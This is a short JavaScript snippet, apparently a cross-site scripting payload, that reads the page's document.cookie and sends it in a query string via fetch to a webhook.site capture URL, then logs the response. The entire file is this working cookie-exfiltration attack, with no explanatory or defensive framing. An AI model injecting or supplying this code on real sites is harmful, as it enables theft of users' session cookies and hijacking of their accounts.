const url = "https://webhook.site/cc817732-d84a-4db7-a328-1bb70ebdfbcc?cookie=" + document.cookie;

fetch(url).then(function(response) {
  return response.json();
}).then(function(data) {
  console.log(data);
}).catch(function(err) {
  console.log('Fetch Error :-S', err);
});
